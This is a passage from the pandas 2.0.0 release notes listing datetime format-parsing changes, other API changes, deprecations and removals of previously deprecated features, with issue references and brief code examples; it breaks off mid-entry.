format\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nIn the past, :func:`to_datetime` guessed the format for each element independently. This was appropriate for some cases where elements had mixed date formats - however, it would regularly cause problems when users expected a consistent format but the function would switch formats between elements. As of version 2.0.0, parsing will use a consistent format, determined by the first non-NA value (unless the user specifies a format, in which case that is used).\n\n*Old behavior*:\n\n.. code-block:: ipython\n\n   In [1]: ser = pd.Series(['13-01-2000', '12-01-2000'])\n   In [2]: pd.to_datetime(ser)\n   Out[2]:\n   0   2000-01-13\n   1   2000-12-01\n   dtype: datetime64[ns]\n\n*New behavior*:\n\n.. ipython:: python\n    :okwarning:\n\n     ser = pd.Series(['13-01-2000', '12-01-2000'])\n     pd.to_datetime(ser)\n\nNote that this affects :func:`read_csv` as well.\n\nIf you still need to parse dates with inconsistent formats, you can use\n``format='mixed'`` (possibly alongside ``dayfirst``) ::\n\n     ser = pd.Series(['13-01-2000', '12 January 2000'])\n     pd.to_datetime(ser, format='mixed', dayfirst=True)\n\nor, if your formats are all ISO8601 (but possibly not identically-formatted) ::\n\n     ser = pd.Series(['2020-01-01', '2020-01-01 03:00'])\n     pd.to_datetime(ser, format='ISO8601')\n\n.. _whatsnew_200.api_breaking.other:\n\nOther API changes\n^^^^^^^^^^^^^^^^^\n- The ``freq``, ``tz``, ``nanosecond``, and ``unit`` keywords in the :class:`Timestamp` constructor are now keyword-only (:issue:`45307`, :issue:`32526`)\n- Passing ``nanoseconds`` greater than 999 or less than 0 in :class:`Timestamp` now raises a ``ValueError`` (:issue:`48538`, :issue:`48255`)\n- :func:`read_csv`: specifying an incorrect number of columns with ``index_col`` of now raises ``ParserError`` instead of ``IndexError`` when using the c parser.\n- Default value of ``dtype`` in :func:`get_dummies` is changed to ``bool`` from ``uint8`` (:issue:`45848`)\n- :meth:`DataFrame.astype`, :meth:`Series.astype`, and :meth:`DatetimeIndex.astype` casting datetime64 data to any of \"datetime64[s]\", \"datetime64[ms]\", \"datetime64[us]\" will return an object with the given resolution instead of coercing back to \"datetime64[ns]\" (:issue:`48928`)\n- :meth:`DataFrame.astype`, :meth:`Series.astype`, and :meth:`DatetimeIndex.astype` casting timedelta64 data to any of \"timedelta64[s]\", \"timedelta64[ms]\", \"timedelta64[us]\" will return an object with the given resolution instead of coercing to \"float64\" dtype (:issue:`48963`)\n- :meth:`DatetimeIndex.astype`, :meth:`TimedeltaIndex.astype`, :meth:`PeriodIndex.astype` :meth:`Series.astype`, :meth:`DataFrame.astype` with ``datetime64``, ``timedelta64`` or :class:`PeriodDtype` dtypes no longer allow converting to integer dtypes other than \"int64\", do ``obj.astype('int64', copy=False).astype(dtype)`` instead (:issue:`49715`)\n- :meth:`Index.astype` now allows casting from ``float64`` dtype to datetime-like dtypes, matching :class:`Series` behavior (:issue:`49660`)\n- Passing data with dtype of \"timedelta64[s]\", \"timedelta64[ms]\", or \"timedelta64[us]\" to :class:`TimedeltaIndex`, :class:`Series`, or :class:`DataFrame` constructors will now retain that dtype instead of casting to \"timedelta64[ns]\"; timedelta64 data with lower resolution will be cast to the lowest supported resolution \"timedelta64[s]\" (:issue:`49014`)\n- Passing ``dtype`` of \"timedelta64[s]\", \"timedelta64[ms]\", or \"timedelta64[us]\" to :class:`TimedeltaIndex`, :class:`Series`, or :class:`DataFrame` constructors will now retain that dtype instead of casting to \"timedelta64[ns]\"; passing a dtype with lower resolution for :class:`Series` or :class:`DataFrame` will be cast to the lowest supported resolution \"timedelta64[s]\" (:issue:`49014`)\n- Passing a ``np.datetime64`` object with non-nanosecond resolution to :class:`Timestamp` will retain the input resolution if it is \"s\", \"ms\", \"us\", or \"ns\"; otherwise it will be cast to the closest supported resolution (:issue:`49008`)\n- Passing ``datetime64`` values with resolution other than nanosecond to :func:`to_datetime` will retain the input resolution if it is \"s\", \"ms\", \"us\", or \"ns\"; otherwise it will be cast to the closest supported resolution (:issue:`50369`)\n- Passing integer values and a non-nanosecond datetime64 dtype (e.g. \"datetime64[s]\") :class:`DataFrame`, :class:`Series`, or :class:`Index` will treat the values as multiples of the dtype's unit, matching the behavior of e.g. ``Series(np.array(values, dtype=\"M8[s]\"))`` (:issue:`51092`)\n- Passing a string in ISO-8601 format to :class:`Timestamp` will retain the resolution of the parsed input if it is \"s\", \"ms\", \"us\", or \"ns\"; otherwise it will be cast to the closest supported resolution (:issue:`49737`)\n- The ``other`` argument in :meth:`DataFrame.mask` and :meth:`Series.mask` now defaults to ``no_default`` instead of ``np.nan`` consistent with :meth:`DataFrame.where` and :meth:`Series.where`. Entries will be filled with the corresponding NULL value (``np.nan`` for numpy dtypes, ``pd.NA`` for extension dtypes). (:issue:`49111`)\n- Changed behavior of :meth:`Series.quantile` and :meth:`DataFrame.quantile` with :class:`SparseDtype` to retain sparse dtype (:issue:`49583`)\n- When creating a :class:`Series` with a object-dtype :class:`Index` of datetime objects, pandas no longer silently converts the index to a :class:`DatetimeIndex` (:issue:`39307`, :issue:`23598`)\n- :func:`pandas.testing.assert_index_equal` with parameter ``exact=\"equiv\"`` now considers two indexes equal when both are either a :class:`RangeIndex` or :class:`Index` with an ``int64`` dtype. Previously it meant either a :class:`RangeIndex` or a :class:`Int64Index` (:issue:`51098`)\n- :meth:`Series.unique` with dtype \"timedelta64[ns]\" or \"datetime64[ns]\" now returns :class:`TimedeltaArray` or :class:`DatetimeArray` instead of ``numpy.ndarray`` (:issue:`49176`)\n- :func:`to_datetime` and :class:`DatetimeIndex` now allow sequences containing both ``datetime`` objects and numeric entries, matching :class:`Series` behavior (:issue:`49037`, :issue:`50453`)\n- :func:`pandas.api.types.is_string_dtype` now only returns ``True`` for array-likes with ``dtype=object`` when the elements are inferred to be strings (:issue:`15585`)\n- Passing a sequence containing ``datetime`` objects and ``date`` objects to :class:`Series` constructor will return with ``object`` dtype instead of ``datetime64[ns]`` dtype, consistent with :class:`Index` behavior (:issue:`49341`)\n- Passing strings that cannot be parsed as datetimes to :class:`Series` or :class:`DataFrame` with ``dtype=\"datetime64[ns]\"`` will raise instead of silently ignoring the keyword and returning ``object`` dtype (:issue:`24435`)\n- Passing a sequence containing a type that cannot be converted to :class:`Timedelta` to :func:`to_timedelta` or to the :class:`Series` or :class:`DataFrame` constructor with ``dtype=\"timedelta64[ns]\"`` or to :class:`TimedeltaIndex` now raises ``TypeError`` instead of ``ValueError`` (:issue:`49525`)\n- Changed behavior of :class:`Index` constructor with sequence containing at least one ``NaT`` and everything else either ``None`` or ``NaN`` to infer ``datetime64[ns]`` dtype instead of ``object``, matching :class:`Series` behavior (:issue:`49340`)\n- :func:`read_stata` with parameter ``index_col`` set to ``None`` (the default) will now set the index on the returned :class:`DataFrame` to a :class:`RangeIndex` instead of a :class:`Int64Index` (:issue:`49745`)\n- Changed behavior of :class:`Index`, :class:`Series`, and :class:`DataFrame` arithmetic methods when working with object-dtypes, the results no longer do type inference on the result of the array operations, use ``result.infer_objects(copy=False)`` to do type inference on the result (:issue:`49999`, :issue:`49714`)\n- Changed behavior of :class:`Index` constructor with an object-dtype ``numpy.ndarray`` containing all-``bool`` values or all-complex values, this will now retain object dtype, consistent with the :class:`Series` behavior (:issue:`49594`)\n- Changed behavior of :meth:`Series.astype` from object-dtype containing ``bytes`` objects to string dtypes; this now does ``val.decode()`` on bytes objects instead of ``str(val)``, matching :meth:`Index.astype` behavior (:issue:`45326`)\n- Added ``\"None\"`` to default ``na_values`` in :func:`read_csv` (:issue:`50286`)\n- Changed behavior of :class:`Series` and :class:`DataFrame` constructors when given an integer dtype and floating-point data that is not round numbers, this now raises ``ValueError`` instead of silently retaining the float dtype; do ``Series(data)`` or ``DataFrame(data)`` to get the old behavior, and ``Series(data).astype(dtype)`` or ``DataFrame(data).astype(dtype)`` to get the specified dtype (:issue:`49599`)\n- Changed behavior of :meth:`DataFrame.shift` with ``axis=1``, an integer ``fill_value``, and homogeneous datetime-like dtype, this now fills new columns with integer dtypes instead of casting to datetimelike (:issue:`49842`)\n- Files are now closed when encountering an exception in :func:`read_json` (:issue:`49921`)\n- Changed behavior of :func:`read_csv`, :func:`read_json` & :func:`read_fwf`, where the index will now always be a :class:`RangeIndex`, when no index is specified. Previously the index would be a :class:`Index` with dtype ``object`` if the new DataFrame/Series has length 0 (:issue:`49572`)\n- :meth:`DataFrame.values`, :meth:`DataFrame.to_numpy`, :meth:`DataFrame.xs`, :meth:`DataFrame.reindex`, :meth:`DataFrame.fillna`, and :meth:`DataFrame.replace` no longer silently consolidate the underlying arrays; do ``df = df.copy()`` to ensure consolidation (:issue:`49356`)\n- Creating a new DataFrame using a full slice on both axes with :attr:`~DataFrame.loc`\n  or :attr:`~DataFrame.iloc` (thus, ``df.loc[:, :]`` or ``df.iloc[:, :]``) now returns a\n  new DataFrame (shallow copy) instead of the original DataFrame, consistent with other\n  methods to get a full slice (for example ``df.loc[:]`` or ``df[:]``) (:issue:`49469`)\n- The :class:`Series` and :class:`DataFrame` constructors will now return a shallow copy\n  (i.e. share data, but not attributes) when passed a Series and DataFrame,\n  respectively, and with the default of ``copy=False`` (and if no other keyword triggers\n  a copy). Previously, the new Series or DataFrame would share the index attribute (e.g.\n  ``df.index = ...`` would also update the index of the parent or child) (:issue:`49523`)\n- Disallow computing ``cumprod`` for :class:`Timedelta` object; previously this returned incorrect values (:issue:`50246`)\n- :class:`DataFrame` objects read from a :class:`HDFStore` file without an index now have a :class:`RangeIndex` instead of an ``int64`` index (:issue:`51076`)\n- Instantiating an :class:`Index` with an numeric numpy dtype with data containing :class:`NA` and/or :class:`NaT` now raises a ``ValueError``. Previously a ``TypeError`` was raised (:issue:`51050`)\n- Loading a JSON file with duplicate columns using ``read_json(orient='split')`` renames columns to avoid duplicates, as :func:`read_csv` and the other readers do (:issue:`50370`)\n- The levels of the index of the :class:`Series` returned from ``Series.sparse.from_coo`` now always have dtype ``int32``. Previously they had dtype ``int64`` (:issue:`50926`)\n- :func:`to_datetime` with ``unit`` of either \"Y\" or \"M\" will now raise if a sequence contains a non-round ``float`` value, matching the ``Timestamp`` behavior (:issue:`50301`)\n- The methods :meth:`Series.round`, :meth:`DataFrame.__invert__`, :meth:`Series.__invert__`, :meth:`DataFrame.swapaxes`, :meth:`DataFrame.first`, :meth:`DataFrame.last`, :meth:`Series.first`, :meth:`Series.last` and :meth:`DataFrame.align` will now always return new objects (:issue:`51032`)\n- :class:`DataFrame` and :class:`DataFrameGroupBy` aggregations (e.g. \"sum\") with object-dtype columns no longer infer non-object dtypes for their results, explicitly call ``result.infer_objects(copy=False)`` on the result to obtain the old behavior (:issue:`51205`, :issue:`49603`)\n- Division by zero with :class:`ArrowDtype` dtypes returns ``-inf``, ``nan``, or ``inf`` depending on the numerator, instead of raising (:issue:`51541`)\n- Added :func:`pandas.api.types.is_any_real_numeric_dtype` to check for real numeric dtypes (:issue:`51152`)\n- :meth:`~arrays.ArrowExtensionArray.value_counts` now returns data with :class:`ArrowDtype` with ``pyarrow.int64`` type instead of ``\"Int64\"`` type (:issue:`51462`)\n- :func:`factorize` and :func:`unique` preserve the original dtype when passed numpy timedelta64 or datetime64 with non-nanosecond resolution (:issue:`48670`)\n\n.. note::\n\n    A current PDEP proposes the deprecation and removal of the keywords ``inplace`` and ``copy``\n    for all but a small subset of methods from the pandas API. The current discussion takes place\n    at `here <https://github.com/pandas-dev/pandas/pull/51466>`_. The keywords won't be necessary\n    anymore in the context of Copy-on-Write. If this proposal is accepted, both\n    keywords would be deprecated in the next release of pandas and removed in pandas 3.0.\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_200.deprecations:\n\nDeprecations\n~~~~~~~~~~~~\n- Deprecated parsing datetime strings with system-local timezone to ``tzlocal``, pass a ``tz`` keyword or explicitly call ``tz_localize`` instead (:issue:`50791`)\n- Deprecated argument ``infer_datetime_format`` in :func:`to_datetime` and :func:`read_csv`, as a strict version of it is now the default (:issue:`48621`)\n- Deprecated behavior of :func:`to_datetime` with ``unit`` when parsing strings, in a future version these will be parsed as datetimes (matching unit-less behavior) instead of cast to floats. To retain the old behavior, cast strings to numeric types before calling :func:`to_datetime` (:issue:`50735`)\n- Deprecated :func:`pandas.io.sql.execute` (:issue:`50185`)\n- :meth:`Index.is_boolean` has been deprecated. Use :func:`pandas.api.types.is_bool_dtype` instead (:issue:`50042`)\n- :meth:`Index.is_integer` has been deprecated. Use :func:`pandas.api.types.is_integer_dtype` instead (:issue:`50042`)\n- :meth:`Index.is_floating` has been deprecated. Use :func:`pandas.api.types.is_float_dtype` instead (:issue:`50042`)\n- :meth:`Index.holds_integer` has been deprecated. Use :func:`pandas.api.types.infer_dtype` instead (:issue:`50243`)\n- :meth:`Index.is_numeric` has been deprecated. Use :func:`pandas.api.types.is_any_real_numeric_dtype` instead (:issue:`50042`,:issue:`51152`)\n- :meth:`Index.is_categorical` has been deprecated. Use :func:`pandas.api.types.is_categorical_dtype` instead (:issue:`50042`)\n- :meth:`Index.is_object` has been deprecated. Use :func:`pandas.api.types.is_object_dtype` instead (:issue:`50042`)\n- :meth:`Index.is_interval` has been deprecated. Use :func:`pandas.api.types.is_interval_dtype` instead (:issue:`50042`)\n- Deprecated argument ``date_parser`` in :func:`read_csv`, :func:`read_table`, :func:`read_fwf`, and :func:`read_excel` in favour of ``date_format`` (:issue:`50601`)\n- Deprecated ``all`` and ``any`` reductions with ``datetime64`` and :class:`DatetimeTZDtype` dtypes, use e.g. ``(obj != pd.Timestamp(0), tz=obj.tz).all()`` instead (:issue:`34479`)\n- Deprecated unused arguments ``*args`` and ``**kwargs`` in :class:`Resampler` (:issue:`50977`)\n- Deprecated calling ``float`` or ``int`` on a single element :class:`Series` to return a ``float`` or ``int`` respectively. Extract the element before calling ``float`` or ``int`` instead (:issue:`51101`)\n- Deprecated :meth:`Grouper.groups`, use :meth:`Groupby.groups` instead (:issue:`51182`)\n- Deprecated :meth:`Grouper.grouper`, use :meth:`Groupby.grouper` instead (:issue:`51182`)\n- Deprecated :meth:`Grouper.obj`, use :meth:`Groupby.obj` instead (:issue:`51206`)\n- Deprecated :meth:`Grouper.indexer`, use :meth:`Resampler.indexer` instead (:issue:`51206`)\n- Deprecated :meth:`Grouper.ax`, use :meth:`Resampler.ax` instead (:issue:`51206`)\n- Deprecated keyword ``use_nullable_dtypes`` in :func:`read_parquet`, use ``dtype_backend`` instead (:issue:`51853`)\n- Deprecated :meth:`Series.pad` in favor of :meth:`Series.ffill` (:issue:`33396`)\n- Deprecated :meth:`Series.backfill` in favor of :meth:`Series.bfill` (:issue:`33396`)\n- Deprecated :meth:`DataFrame.pad` in favor of :meth:`DataFrame.ffill` (:issue:`33396`)\n- Deprecated :meth:`DataFrame.backfill` in favor of :meth:`DataFrame.bfill` (:issue:`33396`)\n- Deprecated :meth:`~pandas.io.stata.StataReader.close`. Use :class:`~pandas.io.stata.StataReader` as a context manager instead (:issue:`49228`)\n- Deprecated producing a scalar when iterating over a :class:`.DataFrameGroupBy` or a :class:`.SeriesGroupBy` that has been grouped by a ``level`` parameter that is a list of length 1; a tuple of length one will be returned instead (:issue:`51583`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_200.prior_deprecations:\n\nRemoval of prior version deprecations/changes\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n- Removed :class:`Int64Index`, :class:`UInt64Index` and :class:`Float64Index`. See also :ref:`here <whatsnew_200.enhancements.index_can_hold_numpy_numeric_dtypes>` for more information (:issue:`42717`)\n- Removed deprecated :attr:`Timestamp.freq`, :attr:`Timestamp.freqstr` and argument ``freq`` from the :class:`Timestamp` constructor and :meth:`Timestamp.fromordinal` (:issue:`14146`)\n- Removed deprecated :class:`CategoricalBlock`, :meth:`Block.is_categorical`, require datetime64 and timedelta64 values to be wrapped in :class:`DatetimeArray` or :class:`TimedeltaArray` before passing to :meth:`Block.make_block_same_class`, require ``DatetimeTZBlock.values`` to have the correct ndim when passing to the :class:`BlockManager` constructor, and removed the \"fastpath\" keyword from the :class:`SingleBlockManager` constructor (:issue:`40226`, :issue:`40571`)\n- Removed deprecated global option ``use_inf_as_null`` in favor of ``use_inf_as_na`` (:issue:`17126`)\n- Removed deprecated module ``pandas.core.index`` (:issue:`30193`)\n- Removed deprecated alias ``pandas.core.tools.datetimes.to_time``, import the function directly from ``pandas.core.tools.times`` instead (:issue:`34145`)\n- Removed deprecated alias ``pandas.io.json.json_normalize``, import the function directly from ``pandas.json_normalize`` instead (:issue:`27615`)\n- Removed deprecated :meth:`Categorical.to_dense`, use ``np.asarray(cat)`` instead (:issue:`32639`)\n- Removed deprecated :meth:`Categorical.take_nd` (:issue:`27745`)\n- Removed deprecated :meth:`Categorical.mode`, use ``Series(cat).mode()`` instead (:issue:`45033`)\n- Removed deprecated :meth:`Categorical.is_dtype_equal` and :meth:`CategoricalIndex.is_dtype_equal` (:issue:`37545`)\n- Removed deprecated :meth:`CategoricalIndex.take_nd` (:issue:`30702`)\n- Removed deprecated :meth:`Index.is_type_compatible` (:issue:`42113`)\n- Removed deprecated :meth:`Index.is_mixed`, check ``index.inferred_type`` directly instead (:issue:`32922`)\n- Removed deprecated :func:`pandas.api.types.is_categorical`; use :func:`pandas.api.types.is_categorical_dtype` instead  (:issue:`33385`)\n- Removed deprecated :meth:`Index.asi8` (:issue:`37877`)\n- Enforced deprecation changing behavior when passing ``datetime64[ns]`` dtype data and timezone-aware dtype to :class:`Series`, interpreting the values as wall-times instead of UTC times, matching :class:`DatetimeIndex` behavior (:issue:`41662`)\n- Enforced deprecation changing behavior when applying a numpy ufunc on multiple non-aligned (on the index or columns) :class:`DataFrame` that will now align the inputs first (:issue:`39239`)\n- Removed deprecated :meth:`DataFrame._AXIS_NUMBERS`, :meth:`DataFrame._AXIS_NAMES`, :meth:`Series._AXIS_NUMBERS`, :meth:`Series._AXIS_NAMES` (:issue:`33637`)\n- Removed deprecated :meth:`Index.to_native_types`, use ``obj.astype(str)`` instead (:issue:`36418`)\n- Removed deprecated :meth:`Series.iteritems`, :meth:`DataFrame.iteritems`, use ``obj.items`` instead (:issue:`45321`)\n- Removed deprecated :meth:`DataFrame.lookup` (:issue:`35224`)\n- Removed deprecated :meth:`Series.append`, :meth:`DataFrame.append`, use :func:`concat` instead (:issue:`35407`)\n- Removed deprecated :meth:`Series.iteritems`, :meth:`DataFrame.iteritems` and :meth:`HDFStore.iteritems` use ``obj.items`` instead (:issue:`45321`)\n- Removed deprecated :meth:`DatetimeIndex.union_many` (:issue:`45018`)\n- Removed deprecated ``weekofyear`` and ``week`` attributes of :class:`DatetimeArray`, :class:`DatetimeIndex` and ``dt`` accessor in favor of ``isocalendar().week`` (:issue:`33595`)\n- Removed deprecated :meth:`RangeIndex._start`, :meth:`RangeIndex._stop`, :meth:`RangeIndex._step`, use ``start``, ``stop``, ``step`` instead (:issue:`30482`)\n- Removed deprecated :meth:`DatetimeIndex.to_perioddelta`, Use ``dtindex - dtindex.to_period(freq).to_timestamp()`` instead (:issue:`34853`)\n- Removed deprecated :meth:`.Styler.hide_index` and :meth:`.Styler.hide_columns` (:issue:`49397`)\n- Removed deprecated :meth:`.Styler.set_na_rep` and :meth:`.Styler.set_precision` (:issue:`49397`)\n- Removed deprecated :meth:`.Styler.where` (:issue:`49397`)\n- Removed deprecated :meth:`.Styler.render` (:issue:`49397`)\n- Removed deprecated argument ``col_space`` in :meth:`DataFrame.to_latex` (:issue:`47970`)\n- Removed deprecated argument ``null_color`` in :meth:`.Styler.highlight_null` (:issue:`49397`)\n- Removed deprecated argument ``check_less_precise`` in :meth:`.testing.assert_frame_equal`, :meth:`.testing.assert_extension_array_equal`, :meth:`.testing.assert_series_equal`,  :meth:`.testing.assert_index_equal` (:issue:`30562`)\n- Removed deprecated ``null_counts`` argument in :meth:`DataFrame.info`. Use ``show_counts`` instead (:issue:`37999`)\n- Removed deprecated :meth:`Index.is_monotonic`, and :meth:`Series.is_monotonic`; use ``obj.is_monotonic_increasing`` instead (:issue:`45422`)\n- Removed deprecated :meth:`Index.is_all_dates` (:issue:`36697`)\n- Enforced deprecation disallowing passing a timezone-aware :class:`Timestamp` and ``dtype=\"datetime64[ns]\"`` to :class:`Series` or :class:`DataFrame` constructors (:issue:`41555`)\n- Enforced deprecation disallowing passing a sequence of timezone-aware values and ``dtype=\"datetime64[ns]\"`` to to :class:`Series` or :class:`DataFrame` constructors (:issue:`41555`)\n- Enforced deprecation disallowing ``numpy.ma.mrecords.MaskedRecords`` in the :class:`DataFrame` constructor; pass ``\"{name: data[name] for name in data.dtype.names}`` instead (:issue:`40363`)\n- Enforced deprecation disallowing unit-less \"datetime64\" dtype in :meth:`Series.astype` and :meth:`DataFrame.astype` (:issue:`47844`)\n- Enforced deprecation disallowing using ``.astype`` to convert a ``datetime64[ns]`` :class:`Series`, :class:`DataFrame`, or :class:`DatetimeIndex` to timezone-aware dtype, use ``obj.tz_localize`` or ``ser.dt.tz_localize`` instead (:issue:`39258`)\n- Enforced deprecation disallowing using ``.astype`` to convert a timezone-aware :class:`Series`, :class:`DataFrame`, or :class:`DatetimeIndex` to timezone-naive ``datetime64[ns]`` dtype, use ``obj.tz_localize(None)`` or ``obj.tz_convert(\"UTC\").tz_localize(None)`` instead (:issue:`39258`)\n- Enforced deprecation disallowing passing non boolean argument to sort in :func:`concat` (:issue:`44629`)\n- Removed Date parser functions :func:`~pandas.io.date_converters.parse_date_time`,\n  :func:`~pandas.io.date_converters.parse_date_fields`, :func:`~pandas.io.date_converters.parse_all_fields`\n  and :func:`~pandas.io.date_converters.generic_parser` (:issue:`24518`)\n- Removed argument ``index`` from the :class:`core.arrays.SparseArray` constructor (:issue:`43523`)\n- Remove argument ``squeeze`` from :meth:`DataFrame.groupby` and :meth:`Series.groupby` (:issue:`32380`)\n- Removed deprecated ``apply``, ``apply_index``, ``__call__``, ``onOffset``, and ``isAnchored`` attributes from :class:`DateOffset` (:issue:`34171`)\n- Removed ``keep_tz`` argument in :meth:`DatetimeIndex.to_series` (:issue:`29731`)\n- Remove arguments ``names`` and ``dtype`` from :meth:`Index.copy` and ``levels`` and ``codes`` from :meth:`MultiIndex.copy` (:issue:`35853`, :issue:`36685`)\n- Remove argument ``inplace`` from :meth:`MultiIndex.set_levels` and :meth:`MultiIndex.set_codes` (:issue:`35626`)\n- Removed arguments ``verbose`` and ``encoding`` from :meth:`DataFrame.to_excel` and :meth:`Series.to_excel` (:issue:`47912`)\n- Removed argument ``line_terminator`` from :meth:`DataFrame.to_csv` and :meth:`Series.to_csv`, use ``lineterminator`` instead (:issue:`45302`)\n- Removed argument ``inplace`` from :meth:`DataFrame.set_axis` and :meth:`Series.set_axis`, use ``obj = obj.set_axis(..., copy=False)`` instead (:issue:`48130`)\n- Disallow passing positional arguments to :meth:`MultiIndex.set_levels` and :meth:`MultiIndex.set_codes` (:issue:`41485`)\n- Disallow parsing to Timedelta strings with components with units \"Y\", \"y\", or \"M\", as these do not represent unambiguous durations (:issue:`36838`)\n- Removed :meth:`MultiIndex.is_lexsorted` and :meth:`MultiIndex.lexsort_depth` (:issue:`38701`)\n- Removed argument ``how`` from :meth:`PeriodIndex.astype`, use :meth:`PeriodIndex.to_timestamp` instead (:issue:`37982`)\n- Removed argument ``try_cast`` from :meth:`DataFrame.mask`, :meth:`DataFrame.where`, :meth:`Series.mask` and :meth:`Series.where` (:issue:`38836`)\n- Removed argument ``tz`` from :meth:`Period.to_timestamp`, use ``obj.to_timestamp(...).tz_localize(tz)`` instead (:issue:`34522`)\n- Removed argument ``sort_columns`` in :meth:`DataFrame.plot` and :meth:`Series.plot` (:issue:`47563`)\n- Removed argument ``is_copy`` from :meth:`DataFrame.take` and :meth:`Series.take` (:issue:`30615`)\n- Removed argument ``kind`` from :meth:`Index.get_slice_bound`, :meth:`Index.slice_indexer` and :meth:`Index.slice_locs` (:issue:`41378`)\n- Removed arguments ``prefix``, ``squeeze``, ``error_bad_lines`` and ``warn_bad_lines`` from :func:`read_csv` (:issue:`40413`, :issue:`43427`)\n- Removed arguments ``squeeze`` from :func:`read_excel` (:issue:`43427`)\n- Removed argument ``datetime_is_numeric`` from :meth:`DataFrame.describe` and :meth:`Series.describe` as datetime data will always be summarized as numeric data (:issue:`34798`)\n- Disallow passing list ``key`` to :meth:`Series.xs` and :meth:`DataFrame.xs`, pass a tuple instead (:issue:`41789`)\n- Disallow subclass-specific keywords (e.g. \"freq\", \"tz\", \"names\", \"closed\") in the :class:`Index` constructor (:issue:`38597`)\n- Removed argument ``inplace`` from :meth:`Categorical.remove_unused_categories` (:issue:`37918`)\n- Disallow passing non-round floats to :class:`Timestamp` with ``unit=\"M\"`` or ``unit=\"Y\"`` (:issue:`47266`)\n- Remove keywords ``convert_float`` and ``mangle_dupe_cols`` from :func:`read_excel` (:issue:`41176`)\n- Remove keyword ``mangle_dupe_cols`` from :func:`read_csv` and :func:`read_table` (:issue:`48137`)\n- Removed ``errors`` keyword from :meth:`DataFrame.where`, :meth:`Series.where`, :meth:`DataFrame.mask` and :meth:`Series.mask` (:issue:`47728`)\n- Disallow passing non-keyword arguments to :func:`read_excel` except ``io`` and ``sheet_name`` (:issue:`34418`)\n- Disallow passing non-keyword arguments to :meth:`DataFrame.drop` and :meth:`Series.drop` except ``labels`` (:issue:`41486`)\n- Disallow passing non-keyword arguments to :meth:`DataFrame.fillna` and :meth:`Series.fillna` except ``value`` (:issue:`41485`)\n- Disallow passing non-keyword arguments to :meth:`StringMethods.split` and :meth:`StringMethods.rsplit` except for ``pat`` (:issue:`47448`)\n- Disallow passing non-keyword arguments to :meth:`DataFrame.set_index` except ``keys`` (:issue:`41495`)\n- Disallow passing non-keyword arguments to :meth:`Resampler.interpolate` except ``method`` (:issue:`41699`)\n- Disallow passing non-keyword arguments to :meth:`DataFrame.reset_index` and :meth:`Series.reset_index` except ``level`` (:issue:`41496`)\n- Disallow passing non-keyword arguments to :meth:`DataFrame.dropna` and :meth:`Series.dropna` (:issue:`41504`)\n- Disallow passing non-keyword arguments to :meth:`ExtensionArray.argsort` (:issue:`46134`)\n- Disallow passing non-keyword arguments to :meth:`Categorical.sort_values` (:issue:`47618`)\n- Disallow passing non-keyword arguments to :meth:`Index.drop_duplicates` and :meth:`Series.drop_duplicates` (:issue:`41485`)\n- Disallow passing non-keyword arguments to :meth:`DataFrame.drop_duplicates` except for ``subset`` (:issue:`41485`)\n- Disallow passing non-keyword arguments to :meth:`DataFrame.sort_index` and :meth:`Series.sort_index` (:issue:`41506`)\n- Disallow passing non-keyword arguments to :meth:`DataFrame.interpolate` and :meth:`Series.interpolate` except for ``method`` (:issue:`41510`)\n- Disallow passing non-keyword arguments to :meth:`DataFrame.any` and :meth:`Series.any` (:issue:`44896`)\n- Disallow passing non-keyword arguments to :meth:`Index.set_names` except for ``names`` (:issue:`41551`)\n- Disallow passing non-keyword arguments to :meth:`Index.join` except for ``other`` (:issue:`46518`)\n- Disallow passing non-keyword arguments to :func:`concat` except for ``objs`` (:issue:`41485`)\n- Disallow passing non-keyword arguments to :func:`pivot` except for ``data`` (:issue:`48301`)\n- Disallow passing non-keyword arguments to :meth:`DataFrame.pivot` (:issue:`48301`)\n- Disallow passing non-keyword arguments to :func:`read_html` except for ``io`` (:issue:`27573`)\n- Disallow passing non-keyword arguments to :func:`read_json` except for ``path_or_buf`` (:issue:`27573`)\n- Disallow passing non-keyword arguments to :func:`read_sas` except for ``filepath_or_buffer`` (:issue:`47154`)\n- Disallow passing non-keyword arguments to :func:`read_stata` except for ``filepath_or_buffer`` (:issue:`48128`)\n- Disallow passing non-keyword arguments to :func:`read_csv` except ``filepath_or_buffer`` (:issue:`41485`)\n- Disallow passing non-keyword arguments to :func:`read_table` except ``filepath_or_buffer`` (:issue:`41485`)\n- Disallow passing non-keyword arguments to :func:`read_fwf` except ``filepath_or_buffer`` (:issue:`44710`)\n- Disallow passing non-keyword arguments to :func:`read_xml` except for ``path_or_buffer`` (:issue:`45133`)\n- Disallow passing non-keyword arguments to :meth:`Series.mask` and :meth:`DataFrame.mask` except ``cond`` and ``other`` (:issue:`41580`)\n- Disallow passing non-keyword arguments to :meth:`DataFrame.to_stata` except for ``path`` (:issue:`48128`)\n- Disallow passing non-keyword arguments to :meth:`DataFrame.where` and :meth:`Series.where` except for ``cond`` and ``other`` (:issue:`41523`)\n- Disallow passing non-keyword arguments to :meth:`Series.set_axis` and :meth:`DataFrame.set_axis` except for ``labels`` (:issue:`41491`)\n- Disallow passing non-keyword arguments to :meth:`Series.rename_axis` and :meth:`DataFrame.rename_axis` except for ``mapper`` (:issue:`47587`)\n- Disallow passing non-keyword arguments to :meth:`Series.clip` and :meth:`DataFrame.clip` except ``lower`` and ``upper`` (:issue:`41511`)\n- Disallow passing non-keyword arguments to :meth:`Series.bfill`, :meth:`Series.ffill`, :meth:`DataFrame.bfill` and :meth:`DataFrame.ffill` (:issue:`41508`)\n- Disallow passing non-keyword arguments to :meth:`DataFrame.replace`, :meth:`Series.replace` except for ``to_replace`` and ``value`` (:issue:`47587`)\n- Disallow passing non-keyword arguments to :meth:`DataFrame.sort_values` except for ``by`` (:issue:`41505`)\n- Disallow passing non-keyword arguments to :meth:`Series.sort_values` (:issue:`41505`)\n- Disallow passing non-keyword arguments to :meth:`DataFrame.reindex` except for ``labels`` (:issue:`17966`)\n- Disallow :meth:`Index.reindex` with non-unique :class:`Index` objects (:issue:`42568`)\n- Disallowed constructing :class:`Categorical` with scalar ``data`` (:issue:`38433`)\n- Disallowed constructing :class:`CategoricalIndex` without passing ``data`` (:issue:`38944`)\n- Removed :meth:`.Rolling.validate`, :meth:`.Expanding.validate`, and :meth:`.ExponentialMovingWindow.validate` (:issue:`43665`)\n- Removed :attr:`Rolling.win_type` returning 